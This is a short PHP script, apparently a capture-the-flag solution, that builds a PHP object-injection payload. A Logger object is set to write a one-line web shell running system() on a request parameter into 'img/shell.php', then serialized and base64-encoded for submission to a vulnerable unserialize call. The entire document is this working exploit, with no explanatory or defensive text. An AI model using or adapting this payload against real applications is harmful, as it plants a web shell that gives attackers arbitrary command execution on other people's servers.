<?php
class Logger{
    private $logFile = "img/shell.php";
    private $initMsg;
    private $exitMsg="<?php system(\$_GET['cmd']); ?>";
}

$obj = new Logger();

echo base64_encode(serialize($obj));
